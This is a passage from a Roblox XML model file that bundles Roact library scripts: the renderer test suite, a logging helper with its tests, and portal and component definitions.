local Config = require(script.Parent.Config)

return Config.new()]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXB9E5652391374151B81CBEEC896BA840">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">RobloxRenderer.spec</string>
					<string name="ScriptGuid">{8EEF3054-2833-42DC-8AB9-C2CE8E3F98D5}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local assertDeepEqual = require(script.Parent.assertDeepEqual)
	local Binding = require(script.Parent.Binding)
	local Children = require(script.Parent.PropMarkers.Children)
	local Component = require(script.Parent.Component)
	local createElement = require(script.Parent.createElement)
	local createFragment = require(script.Parent.createFragment)
	local createReconciler = require(script.Parent.createReconciler)
	local createRef = require(script.Parent.createRef)
	local createSpy = require(script.Parent.createSpy)
	local GlobalConfig = require(script.Parent.GlobalConfig)
	local Portal = require(script.Parent.Portal)
	local Ref = require(script.Parent.PropMarkers.Ref)

	local RobloxRenderer = require(script.Parent.RobloxRenderer)

	local reconciler = createReconciler(RobloxRenderer)

	describe("mountHostNode", function()
		it("should create instances with correct props", function()
			local parent = Instance.new("Folder")
			local value = "Hello!"
			local key = "Some Key"

			local element = createElement("StringValue", {
				Value = value,
			})

			local node = reconciler.createVirtualNode(element, parent, key)

			RobloxRenderer.mountHostNode(reconciler, node)

			expect(#parent:GetChildren()).to.equal(1)

			local root = parent:GetChildren()[1]

			expect(root.ClassName).to.equal("StringValue")
			expect(root.Value).to.equal(value)
			expect(root.Name).to.equal(key)
		end)

		it("should create children with correct names and props", function()
			local parent = Instance.new("Folder")
			local rootValue = "Hey there!"
			local childValue = 173
			local key = "Some Key"

			local element = createElement("StringValue", {
				Value = rootValue,
			}, {
				ChildA = createElement("IntValue", {
					Value = childValue,
				}),

				ChildB = createElement("Folder"),
			})

			local node = reconciler.createVirtualNode(element, parent, key)

			RobloxRenderer.mountHostNode(reconciler, node)

			expect(#parent:GetChildren()).to.equal(1)

			local root = parent:GetChildren()[1]

			expect(root.ClassName).to.equal("StringValue")
			expect(root.Value).to.equal(rootValue)
			expect(root.Name).to.equal(key)

			expect(#root:GetChildren()).to.equal(2)

			local childA = root.ChildA
			local childB = root.ChildB

			expect(childA).to.be.ok()
			expect(childB).to.be.ok()

			expect(childA.ClassName).to.equal("IntValue")
			expect(childA.Value).to.equal(childValue)

			expect(childB.ClassName).to.equal("Folder")
		end)

		it("should attach Bindings to Roblox properties", function()
			local parent = Instance.new("Folder")
			local key = "Some Key"

			local binding, update = Binding.create(10)
			local element = createElement("IntValue", {
				Value = binding,
			})

			local node = reconciler.createVirtualNode(element, parent, key)

			RobloxRenderer.mountHostNode(reconciler, node)

			expect(#parent:GetChildren()).to.equal(1)

			local instance = parent:GetChildren()[1]

			expect(instance.ClassName).to.equal("IntValue")
			expect(instance.Value).to.equal(10)

			update(20)

			expect(instance.Value).to.equal(20)

			RobloxRenderer.unmountHostNode(reconciler, node)
		end)

		it("should connect Binding refs", function()
			local parent = Instance.new("Folder")
			local key = "Some Key"

			local ref = createRef()
			local element = createElement("Frame", {
				[Ref] = ref,
			})

			local node = reconciler.createVirtualNode(element, parent, key)

			RobloxRenderer.mountHostNode(reconciler, node)

			expect(#parent:GetChildren()).to.equal(1)

			local instance = parent:GetChildren()[1]

			expect(ref.current).to.be.ok()
			expect(ref.current).to.equal(instance)

			RobloxRenderer.unmountHostNode(reconciler, node)
		end)

		it("should call function refs", function()
			local parent = Instance.new("Folder")
			local key = "Some Key"

			local spyRef = createSpy()
			local element = createElement("Frame", {
				[Ref] = spyRef.value,
			})

			local node = reconciler.createVirtualNode(element, parent, key)

			RobloxRenderer.mountHostNode(reconciler, node)

			expect(#parent:GetChildren()).to.equal(1)

			local instance = parent:GetChildren()[1]

			expect(spyRef.callCount).to.equal(1)
			spyRef:assertCalledWith(instance)

			RobloxRenderer.unmountHostNode(reconciler, node)
		end)

		it("should throw if setting invalid instance properties", function()
			local configValues = {
				elementTracing = true,
			}

			GlobalConfig.scoped(configValues, function()
				local parent = Instance.new("Folder")
				local key = "Some Key"

				local element = createElement("Frame", {
					Frob = 6,
				})

				local node = reconciler.createVirtualNode(element, parent, key)

				local success, message = pcall(RobloxRenderer.mountHostNode, reconciler, node)
				assert(not success, "Expected call to fail")

				expect(message:find("Frob")).to.be.ok()
				expect(message:find("Frame")).to.be.ok()
				expect(message:find("RobloxRenderer%.spec")).to.be.ok()
			end)
		end)
	end)

	describe("updateHostNode", function()
		it("should update node props and children", function()
			-- TODO: Break up test

			local parent = Instance.new("Folder")
			local key = "updateHostNodeTest"
			local firstValue = "foo"
			local newValue = "bar"

			local defaultStringValue = Instance.new("StringValue").Value

			local element = createElement("StringValue", {
				Value = firstValue
			}, {
				ChildA = createElement("IntValue", {
					Value = 1
				}),
				ChildB = createElement("BoolValue", {
					Value = true,
				}),
				ChildC = createElement("StringValue", {
					Value = "test",
				}),
				ChildD = createElement("StringValue", {
					Value = "test",
				})
			})

			local node = reconciler.createVirtualNode(element, parent, key)
			RobloxRenderer.mountHostNode(reconciler, node)

			-- Not testing mountHostNode's work here, only testing that the
			-- node is properly updated.

			local newElement = createElement("StringValue", {
				Value = newValue,
			}, {
				-- ChildA changes element type.
				ChildA = createElement("StringValue", {
					Value = "test"
				}),
				-- ChildB changes child properties.
				ChildB = createElement("BoolValue", {
					Value = false,
				}),
				-- ChildC should reset its Value property back to the default.
				ChildC = createElement("StringValue", {}),
				-- ChildD is deleted.
				-- ChildE is added.
				ChildE = createElement("Folder", {}),
			})

			RobloxRenderer.updateHostNode(reconciler, node, newElement)

			local root = parent[key]
			expect(root.ClassName).to.equal("StringValue")
			expect(root.Value).to.equal(newValue)
			expect(#root:GetChildren()).to.equal(4)

			local childA = root.ChildA
			expect(childA.ClassName).to.equal("StringValue")
			expect(childA.Value).to.equal("test")

			local childB = root.ChildB
			expect(childB.ClassName).to.equal("BoolValue")
			expect(childB.Value).to.equal(false)

			local childC = root.ChildC
			expect(childC.ClassName).to.equal("StringValue")
			expect(childC.Value).to.equal(defaultStringValue)

			local childE = root.ChildE
			expect(childE.ClassName).to.equal("Folder")
		end)

		it("should update Bindings", function()
			local parent = Instance.new("Folder")
			local key = "Some Key"

			local bindingA, updateA = Binding.create(10)
			local element = createElement("IntValue", {
				Value = bindingA,
			})

			local node = reconciler.createVirtualNode(element, parent, key)

			RobloxRenderer.mountHostNode(reconciler, node)

			local instance = parent:GetChildren()[1]

			expect(instance.Value).to.equal(10)

			local bindingB, updateB = Binding.create(99)
			local newElement = createElement("IntValue", {
				Value = bindingB,
			})

			RobloxRenderer.updateHostNode(reconciler, node, newElement)

			expect(instance.Value).to.equal(99)

			updateA(123)

			expect(instance.Value).to.equal(99)

			updateB(123)

			expect(instance.Value).to.equal(123)

			RobloxRenderer.unmountHostNode(reconciler, node)
		end)

		it("should update Binding refs", function()
			local parent = Instance.new("Folder")
			local key = "Some Key"

			local refA = createRef()
			local refB = createRef()

			local element = createElement("Frame", {
				[Ref] = refA,
			})

			local node = reconciler.createVirtualNode(element, parent, key)

			RobloxRenderer.mountHostNode(reconciler, node)

			expect(#parent:GetChildren()).to.equal(1)

			local instance = parent:GetChildren()[1]

			expect(refA.current).to.equal(instance)
			expect(refB.current).never.to.be.ok()

			local newElement = createElement("Frame", {
				[Ref] = refB,
			})

			RobloxRenderer.updateHostNode(reconciler, node, newElement)

			expect(refA.current).never.to.be.ok()
			expect(refB.current).to.equal(instance)

			RobloxRenderer.unmountHostNode(reconciler, node)
		end)

		it("should call old function refs with nil and new function refs with a valid rbx", function()
			local parent = Instance.new("Folder")
			local key = "Some Key"

			local spyRefA = createSpy()
			local spyRefB = createSpy()

			local element = createElement("Frame", {
				[Ref] = spyRefA.value,
			})

			local node = reconciler.createVirtualNode(element, parent, key)

			RobloxRenderer.mountHostNode(reconciler, node)

			expect(#parent:GetChildren()).to.equal(1)

			local instance = parent:GetChildren()[1]

			expect(spyRefA.callCount).to.equal(1)
			spyRefA:assertCalledWith(instance)
			expect(spyRefB.callCount).to.equal(0)

			local newElement = createElement("Frame", {
				[Ref] = spyRefB.value,
			})

			RobloxRenderer.updateHostNode(reconciler, node, newElement)

			expect(spyRefA.callCount).to.equal(2)
			spyRefA:assertCalledWith(nil)
			expect(spyRefB.callCount).to.equal(1)
			spyRefB:assertCalledWith(instance)

			RobloxRenderer.unmountHostNode(reconciler, node)
		end)

		it("should not call function refs again if they didn't change", function()
			local parent = Instance.new("Folder")
			local key = "Some Key"

			local spyRef = createSpy()

			local element = createElement("Frame", {
				Size = UDim2.new(1, 0, 1, 0),
				[Ref] = spyRef.value,
			})

			local node = reconciler.createVirtualNode(element, parent, key)

			RobloxRenderer.mountHostNode(reconciler, node)

			expect(#parent:GetChildren()).to.equal(1)

			local instance = parent:GetChildren()[1]

			expect(spyRef.callCount).to.equal(1)
			spyRef:assertCalledWith(instance)

			local newElement = createElement("Frame", {
				Size = UDim2.new(0.5, 0, 0.5, 0),
				[Ref] = spyRef.value,
			})

			RobloxRenderer.updateHostNode(reconciler, node, newElement)

			-- Not called again
			expect(spyRef.callCount).to.equal(1)
		end)

		it("should throw if setting invalid instance properties", function()
			local configValues = {
				elementTracing = true,
			}

			GlobalConfig.scoped(configValues, function()
				local parent = Instance.new("Folder")
				local key = "Some Key"

				local firstElement = createElement("Frame")
				local secondElement = createElement("Frame", {
					Frob = 6,
				})

				local node = reconciler.createVirtualNode(firstElement, parent, key)
				RobloxRenderer.mountHostNode(reconciler, node)

				local success, message = pcall(RobloxRenderer.updateHostNode, reconciler, node, secondElement)
				assert(not success, "Expected call to fail")

				expect(message:find("Frob")).to.be.ok()
				expect(message:find("Frame")).to.be.ok()
				expect(message:find("RobloxRenderer%.spec")).to.be.ok()
			end)
		end)

		it("should delete instances when reconciling to nil children", function()
			local parent = Instance.new("Folder")
			local key = "Some Key"

			local element = createElement("Frame", {
				Size = UDim2.new(1, 0, 1, 0),
			}, {
				child = createElement("Frame"),
			})

			local node = reconciler.createVirtualNode(element, parent, key)

			RobloxRenderer.mountHostNode(reconciler, node)

			expect(#parent:GetChildren()).to.equal(1)

			local instance = parent:GetChildren()[1]
			expect(#instance:GetChildren()).to.equal(1)

			local newElement = createElement("Frame", {
				Size = UDim2.new(0.5, 0, 0.5, 0),
			})

			RobloxRenderer.updateHostNode(reconciler, node, newElement)
			expect(#instance:GetChildren()).to.equal(0)
		end)
	end)

	describe("unmountHostNode", function()
		it("should delete instances from the inside-out", function()
			local parent = Instance.new("Folder")
			local key = "Root"
			local element = createElement("Folder", nil, {
				Child = createElement("Folder", nil, {
					Grandchild = createElement("Folder"),
				}),
			})

			local node = reconciler.mountVirtualNode(element, parent, key)

			expect(#parent:GetChildren()).to.equal(1)

			local root = parent:GetChildren()[1]
			expect(#root:GetChildren()).to.equal(1)

			local child = root:GetChildren()[1]
			expect(#child:GetChildren()).to.equal(1)

			local grandchild = child:GetChildren()[1]

			RobloxRenderer.unmountHostNode(reconciler, node)

			expect(grandchild.Parent).to.equal(nil)
			expect(child.Parent).to.equal(nil)
			expect(root.Parent).to.equal(nil)
		end)

		it("should unsubscribe from any Bindings", function()
			local parent = Instance.new("Folder")
			local key = "Some Key"

			local binding, update = Binding.create(10)
			local element = createElement("IntValue", {
				Value = binding,
			})

			local node = reconciler.createVirtualNode(element, parent, key)

			RobloxRenderer.mountHostNode(reconciler, node)

			local instance = parent:GetChildren()[1]

			expect(instance.Value).to.equal(10)

			RobloxRenderer.unmountHostNode(reconciler, node)
			update(56)

			expect(instance.Value).to.equal(10)
		end)

		it("should clear Binding refs", function()
			local parent = Instance.new("Folder")
			local key = "Some Key"

			local ref = createRef()
			local element = createElement("Frame", {
				[Ref] = ref,
			})

			local node = reconciler.createVirtualNode(element, parent, key)

			RobloxRenderer.mountHostNode(reconciler, node)

			expect(ref.current).to.be.ok()

			RobloxRenderer.unmountHostNode(reconciler, node)

			expect(ref.current).never.to.be.ok()
		end)

		it("should call function refs with nil", function()
			local parent = Instance.new("Folder")
			local key = "Some Key"

			local spyRef = createSpy()
			local element = createElement("Frame", {
				[Ref] = spyRef.value,
			})

			local node = reconciler.createVirtualNode(element, parent, key)

			RobloxRenderer.mountHostNode(reconciler, node)

			expect(spyRef.callCount).to.equal(1)

			RobloxRenderer.unmountHostNode(reconciler, node)

			expect(spyRef.callCount).to.equal(2)
			spyRef:assertCalledWith(nil)
		end)
	end)

	describe("Portals", function()
		it("should create and destroy instances as children of `target`", function()
			local target = Instance.new("Folder")

			local function FunctionComponent(props)
				return createElement("IntValue", {
					Value = props.value,
				})
			end

			local element = createElement(Portal, {
				target = target,
			}, {
				folderOne = createElement("Folder"),
				folderTwo = createElement("Folder"),
				intValueOne = createElement(FunctionComponent, {
					value = 42,
				}),
			})
			local hostParent = nil
			local hostKey = "Some Key"
			local node = reconciler.mountVirtualNode(element, hostParent, hostKey)

			expect(#target:GetChildren()).to.equal(3)

			expect(target:FindFirstChild("folderOne")).to.be.ok()
			expect(target:FindFirstChild("folderTwo")).to.be.ok()
			expect(target:FindFirstChild("intValueOne")).to.be.ok()
			expect(target:FindFirstChild("intValueOne").Value).to.equal(42)

			reconciler.unmountVirtualNode(node)

			expect(#target:GetChildren()).to.equal(0)
		end)

		it("should pass prop updates through to children", function()
			local target = Instance.new("Folder")

			local firstElement = createElement(Portal, {
				target = target,
			}, {
				ChildValue = createElement("IntValue", {
					Value = 1,
				}),
			})

			local secondElement = createElement(Portal, {
				target = target,
			}, {
				ChildValue = createElement("IntValue", {
					Value = 2,
				}),
			})

			local hostParent = nil
			local hostKey = "A Host Key"
			local node = reconciler.mountVirtualNode(firstElement, hostParent, hostKey)

			expect(#target:GetChildren()).to.equal(1)

			local firstValue = target.ChildValue
			expect(firstValue.Value).to.equal(1)

			node = reconciler.updateVirtualNode(node, secondElement)

			expect(#target:GetChildren()).to.equal(1)

			local secondValue = target.ChildValue
			expect(firstValue).to.equal(secondValue)
			expect(secondValue.Value).to.equal(2)

			reconciler.unmountVirtualNode(node)

			expect(#target:GetChildren()).to.equal(0)
		end)

		it("should throw if `target` is nil", function()
			-- TODO: Relax this restriction?
			local element = createElement(Portal)
			local hostParent = nil
			local hostKey = "Keys for Everyone"

			expect(function()
				reconciler.mountVirtualNode(element, hostParent, hostKey)
			end).to.throw()
		end)

		it("should throw if `target` is not a Roblox instance", function()
			local element = createElement(Portal, {
				target = {},
			})
			local hostParent = nil
			local hostKey = "Unleash the keys!"

			expect(function()
				reconciler.mountVirtualNode(element, hostParent, hostKey)
			end).to.throw()
		end)

		it("should recreate instances if `target` changes in an update", function()
			local firstTarget = Instance.new("Folder")
			local secondTarget = Instance.new("Folder")

			local firstElement = createElement(Portal, {
				target = firstTarget,
			}, {
				ChildValue = createElement("IntValue", {
					Value = 1,
				}),
			})

			local secondElement = createElement(Portal, {
				target = secondTarget,
			}, {
				ChildValue = createElement("IntValue", {
					Value = 2,
				}),
			})

			local hostParent = nil
			local hostKey = "Some Key"
			local node = reconciler.mountVirtualNode(firstElement, hostParent, hostKey)

			expect(#firstTarget:GetChildren()).to.equal(1)
			expect(#secondTarget:GetChildren()).to.equal(0)

			local firstChild = firstTarget.ChildValue
			expect(firstChild.Value).to.equal(1)

			node = reconciler.updateVirtualNode(node, secondElement)

			expect(#firstTarget:GetChildren()).to.equal(0)
			expect(#secondTarget:GetChildren()).to.equal(1)

			local secondChild = secondTarget.ChildValue
			expect(secondChild.Value).to.equal(2)

			reconciler.unmountVirtualNode(node)

			expect(#firstTarget:GetChildren()).to.equal(0)
			expect(#secondTarget:GetChildren()).to.equal(0)
		end)
	end)

	describe("Fragments", function()
		it("should parent the fragment's elements into the fragment's parent", function()
			local hostParent = Instance.new("Folder")

			local fragment = createFragment({
				key = createElement("IntValue", {
					Value = 1,
				}),
				key2 = createElement("IntValue", {
					Value = 2,
				}),
			})

			local node = reconciler.mountVirtualNode(fragment, hostParent, "test")

			expect(hostParent:FindFirstChild("key")).to.be.ok()
			expect(hostParent.key.ClassName).to.equal("IntValue")
			expect(hostParent.key.Value).to.equal(1)

			expect(hostParent:FindFirstChild("key2")).to.be.ok()
			expect(hostParent.key2.ClassName).to.equal("IntValue")
			expect(hostParent.key2.Value).to.equal(2)

			reconciler.unmountVirtualNode(node)

			expect(#hostParent:GetChildren()).to.equal(0)
		end)

		it("should allow sibling fragment to have common keys", function()
			local hostParent = Instance.new("Folder")
			local hostKey = "Test"

			local function parent(props)
				return createElement("IntValue", {}, {
					fragmentA = createFragment({
						key = createElement("StringValue", {
							Value = "A",
						}),
						key2 = createElement("StringValue", {
							Value = "B",
						}),
					}),
					fragmentB = createFragment({
						key = createElement("StringValue", {
							Value = "C",
						}),
						key2 = createElement("StringValue", {
							Value = "D",
						}),
					}),
				})
			end

			local node = reconciler.mountVirtualNode(createElement(parent), hostParent, hostKey)
			local parentChildren = hostParent[hostKey]:GetChildren()

			expect(#parentChildren).to.equal(4)

			local childValues = {}

			for _, child in pairs(parentChildren) do
				expect(child.ClassName).to.equal("StringValue")
				childValues[child.Value] = 1 + (childValues[child.Value] or 0)
			end

			-- check if the StringValues have not collided
			expect(childValues.A).to.equal(1)
			expect(childValues.B).to.equal(1)
			expect(childValues.C).to.equal(1)
			expect(childValues.D).to.equal(1)

			reconciler.unmountVirtualNode(node)

			expect(#hostParent:GetChildren()).to.equal(0)
		end)

		it("should render nested fragments", function()
			local hostParent = Instance.new("Folder")

			local fragment = createFragment({
				key = createFragment({
					TheValue = createElement("IntValue", {
						Value = 1,
					}),
					TheOtherValue = createElement("IntValue", {
						Value = 2,
					})
				})
			})

			local node = reconciler.mountVirtualNode(fragment, hostParent, "Test")

			expect(hostParent:FindFirstChild("TheValue")).to.be.ok()
			expect(hostParent.TheValue.ClassName).to.equal("IntValue")
			expect(hostParent.TheValue.Value).to.equal(1)

			expect(hostParent:FindFirstChild("TheOtherValue")).to.be.ok()
			expect(hostParent.TheOtherValue.ClassName).to.equal("IntValue")
			expect(hostParent.TheOtherValue.Value).to.equal(2)

			reconciler.unmountVirtualNode(node)

			expect(#hostParent:GetChildren()).to.equal(0)
		end)

		it("should not add any instances if the fragment is empty", function()
			local hostParent = Instance.new("Folder")

			local node = reconciler.mountVirtualNode(createFragment({}), hostParent, "test")

			expect(#hostParent:GetChildren()).to.equal(0)

			reconciler.unmountVirtualNode(node)

			expect(#hostParent:GetChildren()).to.equal(0)
		end)
	end)

	describe("Context", function()
		it("should pass context values through Roblox host nodes", function()
			local Consumer = Component:extend("Consumer")

			local capturedContext
			function Consumer:init()
				capturedContext = {
					hello = self:__getContext("hello")
				}
			end

			function Consumer:render()
			end

			local element = createElement("Folder", nil, {
				Consumer = createElement(Consumer)
			})
			local hostParent = nil
			local hostKey = "Context Test"
			local context = {
				hello = "world",
			}
			local node = reconciler.mountVirtualNode(element, hostParent, hostKey, context)

			expect(capturedContext).never.to.equal(context)
			assertDeepEqual(capturedContext, context)

			reconciler.unmountVirtualNode(node)
		end)

		it("should pass context values through portal nodes", function()
			local target = Instance.new("Folder")

			local Provider = Component:extend("Provider")

			function Provider:init()
				self:__addContext("foo", "bar")
			end

			function Provider:render()
				return createElement("Folder", nil, self.props[Children])
			end

			local Consumer = Component:extend("Consumer")

			local capturedContext
			function Consumer:init()
				capturedContext = {
					foo = self:__getContext("foo"),
				}
			end

			function Consumer:render()
				return nil
			end

			local element = createElement(Provider, nil, {
				Portal = createElement(Portal, {
					target = target,
				}, {
					Consumer = createElement(Consumer),
				})
			})
			local hostParent = nil
			local hostKey = "Some Key"
			reconciler.mountVirtualNode(element, hostParent, hostKey)

			assertDeepEqual(capturedContext, {
				foo = "bar"
			})
		end)
	end)

	describe("Legacy context", function()
		it("should pass context values through Roblox host nodes", function()
			local Consumer = Component:extend("Consumer")

			local capturedContext
			function Consumer:init()
				capturedContext = self._context
			end

			function Consumer:render()
			end

			local element = createElement("Folder", nil, {
				Consumer = createElement(Consumer)
			})
			local hostParent = nil
			local hostKey = "Context Test"
			local context = {
				hello = "world",
			}
			local node = reconciler.mountVirtualNode(element, hostParent, hostKey, nil, context)

			expect(capturedContext).never.to.equal(context)
			assertDeepEqual(capturedContext, context)

			reconciler.unmountVirtualNode(node)
		end)

		it("should pass context values through portal nodes", function()
			local target = Instance.new("Folder")

			local Provider = Component:extend("Provider")

			function Provider:init()
				self._context.foo = "bar"
			end

			function Provider:render()
				return createElement("Folder", nil, self.props[Children])
			end

			local Consumer = Component:extend("Consumer")

			local capturedContext
			function Consumer:init()
				capturedContext = self._context
			end

			function Consumer:render()
				return nil
			end

			local element = createElement(Provider, nil, {
				Portal = createElement(Portal, {
					target = target,
				}, {
					Consumer = createElement(Consumer),
				})
			})
			local hostParent = nil
			local hostKey = "Some Key"
			reconciler.mountVirtualNode(element, hostParent, hostKey)

			assertDeepEqual(capturedContext, {
				foo = "bar"
			})
		end)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX327A3F87C56942BD8F3075826AF80896">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Logging</string>
					<string name="ScriptGuid">{200B0375-9B7A-409D-9A21-9C51F6F5505C}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	Centralized place to handle logging. Lets us:
	- Unit test log output via `Logging.capture`
	- Disable verbose log messages when not debugging Roact

	This should be broken out into a separate library with the addition of
	scoping and logging configuration.
]]

-- Determines whether log messages will go to stdout/stderr
local outputEnabled = true

-- A set of LogInfo objects that should have messages inserted into them.
-- This is a set so that nested calls to Logging.capture will behave.
local collectors = {}

-- A set of all stack traces that have called warnOnce.
local onceUsedLocations = {}

--[[
	Indent a potentially multi-line string with the given number of tabs, in
	addition to any indentation the string already has.
]]
local function indent(source, indentLevel)
	local indentString = ("\t"):rep(indentLevel)

	return indentString .. source:gsub("\n", "\n" .. indentString)
end

--[[
	Indents a list of strings and then concatenates them together with newlines
	into a single string.
]]
local function indentLines(lines, indentLevel)
	local outputBuffer = {}

	for _, line in ipairs(lines) do
		table.insert(outputBuffer, indent(line, indentLevel))
	end

	return table.concat(outputBuffer, "\n")
end

local logInfoMetatable = {}

--[[
	Automatic coercion to strings for LogInfo objects to enable debugging them
	more easily.
]]
function logInfoMetatable:__tostring()
	local outputBuffer = {"LogInfo {"}

	local errorCount = #self.errors
	local warningCount = #self.warnings
	local infosCount = #self.infos

	if errorCount + warningCount + infosCount == 0 then
		table.insert(outputBuffer, "\t(no messages)")
	end

	if errorCount > 0 then
		table.insert(outputBuffer, ("\tErrors (%d) {"):format(errorCount))
		table.insert(outputBuffer, indentLines(self.errors, 2))
		table.insert(outputBuffer, "\t}")
	end

	if warningCount > 0 then
		table.insert(outputBuffer, ("\tWarnings (%d) {"):format(warningCount))
		table.insert(outputBuffer, indentLines(self.warnings, 2))
		table.insert(outputBuffer, "\t}")
	end

	if infosCount > 0 then
		table.insert(outputBuffer, ("\tInfos (%d) {"):format(infosCount))
		table.insert(outputBuffer, indentLines(self.infos, 2))
		table.insert(outputBuffer, "\t}")
	end

	table.insert(outputBuffer, "}")

	return table.concat(outputBuffer, "\n")
end

local function createLogInfo()
	local logInfo = {
		errors = {},
		warnings = {},
		infos = {},
	}

	setmetatable(logInfo, logInfoMetatable)

	return logInfo
end

local Logging = {}

--[[
	Invokes `callback`, capturing all output that happens during its execution.

	Output will not go to stdout or stderr and will instead be put into a
	LogInfo object that is returned. If `callback` throws, the error will be
	bubbled up to the caller of `Logging.capture`.
]]
function Logging.capture(callback)
	local collector = createLogInfo()

	local wasOutputEnabled = outputEnabled
	outputEnabled = false
	collectors[collector] = true

	local success, result = pcall(callback)

	collectors[collector] = nil
	outputEnabled = wasOutputEnabled

	assert(success, result)

	return collector
end

--[[
	Issues a warning with an automatically attached stack trace.
]]
function Logging.warn(messageTemplate, ...)
	local message = messageTemplate:format(...)

	for collector in pairs(collectors) do
		table.insert(collector.warnings, message)
	end

	-- debug.traceback inserts a leading newline, so we trim it here
	local trace = debug.traceback("", 2):sub(2)
	local fullMessage = ("%s\n%s"):format(message, indent(trace, 1))

	if outputEnabled then
		warn(fullMessage)
	end
end

--[[
	Issues a warning like `Logging.warn`, but only outputs once per call site.

	This is useful for marking deprecated functions that might be called a lot;
	using `warnOnce` instead of `warn` will reduce output noise while still
	correctly marking all call sites.
]]
function Logging.warnOnce(messageTemplate, ...)
	local trace = debug.traceback()

	if onceUsedLocations[trace] then
		return
	end

	onceUsedLocations[trace] = true
	Logging.warn(messageTemplate, ...)
end

return Logging]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXB76E969C49D0446AAABDB91070AF2148">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">createReconcilerCompat.spec</string>
					<string name="ScriptGuid">{7024C388-5337-4B60-9C46-248EBEE129F0}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local createElement = require(script.Parent.createElement)
	local createReconciler = require(script.Parent.createReconciler)
	local Logging = require(script.Parent.Logging)
	local NoopRenderer = require(script.Parent.NoopRenderer)

	local createReconcilerCompat = require(script.Parent.createReconcilerCompat)

	local noopReconciler = createReconciler(NoopRenderer)
	local compatReconciler = createReconcilerCompat(noopReconciler)

	it("reify should only warn once per call site", function()
		local logInfo = Logging.capture(function()
			-- We're using a loop so that we get the same stack trace and only one
			-- warning hopefully.
			for _ = 1, 2 do
				local handle = compatReconciler.reify(createElement("StringValue"))
				noopReconciler.unmountVirtualTree(handle)
			end
		end)

		expect(#logInfo.warnings).to.equal(1)
		expect(logInfo.warnings[1]:find("reify")).to.be.ok()

		logInfo = Logging.capture(function()
			-- This is a different call site, which should trigger another warning.
			local handle = compatReconciler.reify(createElement("StringValue"))
			noopReconciler.unmountVirtualTree(handle)
		end)

		expect(#logInfo.warnings).to.equal(1)
		expect(logInfo.warnings[1]:find("reify")).to.be.ok()
	end)

	it("teardown should only warn once per call site", function()
		local logInfo = Logging.capture(function()
			-- We're using a loop so that we get the same stack trace and only one
			-- warning hopefully.
			for _ = 1, 2 do
				local handle = noopReconciler.mountVirtualTree(createElement("StringValue"))
				compatReconciler.teardown(handle)
			end
		end)

		expect(#logInfo.warnings).to.equal(1)
		expect(logInfo.warnings[1]:find("teardown")).to.be.ok()

		logInfo = Logging.capture(function()
			-- This is a different call site, which should trigger another warning.
			local handle = noopReconciler.mountVirtualTree(createElement("StringValue"))
			compatReconciler.teardown(handle)
		end)

		expect(#logInfo.warnings).to.equal(1)
		expect(logInfo.warnings[1]:find("teardown")).to.be.ok()
	end)

	it("update should only warn once per call site", function()
		local logInfo = Logging.capture(function()
			-- We're using a loop so that we get the same stack trace and only one
			-- warning hopefully.
			for _ = 1, 2 do
				local handle = noopReconciler.mountVirtualTree(createElement("StringValue"))
				compatReconciler.reconcile(handle, createElement("StringValue"))
				noopReconciler.unmountVirtualTree(handle)
			end
		end)

		expect(#logInfo.warnings).to.equal(1)
		expect(logInfo.warnings[1]:find("reconcile")).to.be.ok()

		logInfo = Logging.capture(function()
			-- This is a different call site, which should trigger another warning.
			local handle = noopReconciler.mountVirtualTree(createElement("StringValue"))
			compatReconciler.reconcile(handle, createElement("StringValue"))
			noopReconciler.unmountVirtualTree(handle)
		end)

		expect(#logInfo.warnings).to.equal(1)
		expect(logInfo.warnings[1]:find("reconcile")).to.be.ok()
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX99441E6E3AD246EAB0176AD4D457B067">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Portal</string>
					<string name="ScriptGuid">{D06DB016-C0D4-40B5-93BE-AD9463D91372}</string>
					<ProtectedString name="Source"><![CDATA[local Symbol = require(script.Parent.Symbol)

local Portal = Symbol.named("Portal")

return Portal]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX3A72170F7D83494AA1372195358A73FB">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Component</string>
					<string name="ScriptGuid">{BF735774-304D-4786-A70B-201FBF0A4BAE}</string>
					<ProtectedString name="Source"><![CDATA[local assign = require(script.Parent.assign)
local ComponentLifecyclePhase = require(script.Parent.ComponentLifecyclePhase)
local Type = require(script.Parent.Type)
local Symbol = require(script.Parent.Symbol)
local invalidSetStateMessages = require(script.Parent.invalidSetStateMessages)
local internalAssert = require(script.Parent.internalAssert)

local config = require(script.Parent.GlobalConfig).get()

--[[
	Calling setState during certain lifecycle allowed methods has the potential
	to create an infinitely updating component. Rather than time out, we exit
	with an error if an unreasonable number of self-triggering updates occur
]]
local MAX_PENDING_UPDATES = 100

local InternalData = Symbol.named("InternalData")

local componentMissingRenderMessage = [[
The component %q is missing the `render` method.
`render` must be defined when creating a Roact component!]]

local tooManyUpdatesMessage = [[
The component %q has reached the setState update recursion limit.
When using `setState` in `didUpdate`, make sure that it won't repeat infinitely!]]

local componentClassMetatable = {}

function componentClassMetatable:__tostring()
	return self.__componentName
end

local Component = {}
setmetatable(Component, componentClassMetatable)

Component[Type] = Type.StatefulComponentClass
